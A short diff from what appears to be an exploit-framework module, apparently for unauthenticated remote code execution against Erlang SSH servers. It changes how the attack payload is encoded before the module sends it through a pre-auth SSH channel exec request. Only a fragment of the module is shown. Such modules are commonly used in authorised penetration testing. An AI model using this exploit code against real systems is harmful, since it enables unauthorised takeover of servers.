@@ -76,8 +76,8 @@ func (m *ErlangSSHRCE) Exploit(run *sdk.Context) error {
 	defer conn.Close()
 
 	run.Status("Sending pre-auth exec")
-	bgPayload := run.Base64Bash(run.Payload()) + " &"
-	if err := sendSSH(conn, sshChannelExec(0, erlangCmd(bgPayload))); err != nil {
+	payload := run.EncodedPayload()
+	if err := sendSSH(conn, sshChannelExec(0, erlangCmd(payload))); err != nil {
 		return err
 	}
 
